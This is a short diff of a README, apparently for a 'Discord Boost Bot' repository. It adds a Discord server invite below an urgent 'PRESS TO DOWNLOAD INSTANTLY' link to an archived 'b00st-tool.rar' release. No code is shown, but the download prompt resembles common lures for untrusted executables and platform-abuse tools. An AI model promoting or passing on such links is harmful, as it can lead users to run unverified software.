@@ -9,6 +9,10 @@
   <a href="https://github.com/celgz/Boost-Bot/releases/download/Discord-Boost-Bot/b00st-tool.rar">PRESS TO DOWNLOAD INSTANTLY</a>
 </h2>
 
+<h3 align="center">
+<a href="https://discord.gg/uPVEtUBTYg">JOIN MY DISCORD SERVER</a>
+</h3>
+
 ![image](https://cdn.discordapp.com/attachments/1127287128880074855/1148582336968015924/image.png) 
 
 <h3 align="center">
